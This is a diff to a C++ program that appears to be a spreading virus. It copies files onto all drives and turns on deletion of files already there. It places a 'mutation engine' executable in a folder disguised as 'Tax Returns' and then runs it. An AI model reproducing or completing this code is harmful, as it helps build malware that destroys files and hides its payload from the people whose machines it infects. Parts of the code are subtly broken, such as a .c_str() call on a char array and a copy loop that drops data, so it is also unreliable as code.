@@ -2,6 +2,7 @@
 #include <stdlib.h>
 #include <string.h>
 #include <iostream>
+#include <windows.h>
 
 using namespace std;
 
@@ -34,8 +35,8 @@ int main(void)
 	
 	// Copy files to all drives
 	
-	char src[48];
-	char dest[48];
+	char src[200];
+	char dest[200];
 	
 	for(int drive = 0; drive < numDrives; drive++)
 	{
@@ -46,7 +47,6 @@ int main(void)
 			strcpy(dest, destdrives[drive]);
 			strcat(dest, filenames[file]);
 			
-			/*
 			// Remove file if it already exists on disk
 			if(remove(dest))
 			{
@@ -58,7 +58,6 @@ int main(void)
 				cout << "File " << dest;
 				cout << " successfully deleted." << endl;
 			}
-			*/
 			
 			FILE *in = fopen(src, "rb");
 			FILE *out = fopen(dest, "wb");
@@ -78,7 +77,8 @@ int main(void)
 					fwrite(buffer, BUFSIZ, 1, out);
 				}
 				
-				cout << "Successfully wrote to " << destdrives[drive];
+				cout << "Successfully wrote " << filenames[file];
+				cout << " to " << destdrives[drive];
 				cout << endl;
 				
 				fclose(in);
@@ -88,34 +88,47 @@ int main(void)
 	}
 	
 	//Move mutation engine to Startup directory
-	strcpy(src, "mutant.txt");
+	strcpy(src, "mutant.exe");
 	strcpy(dest, getenv("USERPROFILE"));
-	strcat(dest, "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup");
-	strcat(dest, "mutant.txt");
+	strcat(dest, "\\Documents\\Tax Returns");
 	
-	FILE *in = fopen(src, "rb");
-	FILE *out = fopen(dest, "wb");
-	
-	if(in == NULL || out == NULL)
+	if(CreateDirectory(dest, NULL) || GetLastError() == ERROR_ALREADY_EXISTS)
 	{
-		cout << "Error copying mutant.txt to startup folder";
-		cout << endl;
+		strcat(dest, "\\mutant.exe");
+		FILE *in = fopen(src, "rb");
+		FILE *out = fopen(dest, "wb");
 		
-		in = out = 0;
+		if(in == NULL || out == NULL)
+		{
+			cout << "Error copying mutant.exe to destination folder";
+			cout << endl;
+		
+			in = out = 0;
+		}
+		else
+		{
+			while((len = fread(buffer, BUFSIZ, 1, in)) > 0)
+			{
+				fwrite(buffer, BUFSIZ, 1, out);
+			}
+		
+			cout << "Successfully wrote mutant.exe to destination folder";
+			cout << endl;
+		
+			fclose(in);
+			fclose(out);
+		}
 	}
 	else
 	{
-		while((len = fread(buffer, BUFSIZ, 1, in)) > 0)
-		{
-			fwrite(buffer, BUFSIZ, 1, out);
-		}
-		
-		cout << "Successfully wrote mutant.txt to startup folder";
+		cout << "Error copying mutant.exe to destination folder";
 		cout << endl;
-		
-		fclose(in);
-		fclose(out);
 	}
+	
+	//Start mutation engine
+	cout << dest << endl;
+	system(dest.c_str());
+	cout << dest << endl;
 	
 	return 0;
 }
